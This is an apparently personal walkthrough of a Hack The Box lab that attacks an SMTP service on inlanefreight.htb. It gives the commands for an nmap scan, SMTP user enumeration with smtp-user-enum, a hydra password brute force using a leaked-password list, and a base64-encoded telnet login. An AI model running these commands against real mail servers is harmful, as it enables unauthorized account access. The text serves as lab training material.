Before we start, download the users.list and pws.list files from the HTB resources

Start with checking the connection to the target 
ping -c 1 <Target IP>

nmap -Pn -p- --min-rate 3000 -sV -sC -n 10.129.113.80
Notice the open ports 21 (FTP), 25 (smtp), 80 (http), 443 (ssl/https), 587 (smtp), 3306 (mysql)

smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t <Target IP>
Found user fi***@inlanefreight.htb

Brute force the password for smtp using hydra
hydra -l fi***@inlanefreight.htb -P /usr/share/seclists/Passwords/darkweb2017.txt smtp://<Target IP> -o smtpass -t 64
Found smtp password 9********
hydra 

In a new shell turn username and password into base64 and leave it opened
echo -ne "fi***@inlanefreight.htb" | base64
echo -ne 9******** | base64

In a new shell open a telnet connection
telnet <Target IP> 25
ehlo inlanefreight.htb
auth login
paste the base64 username
paste the base64 password
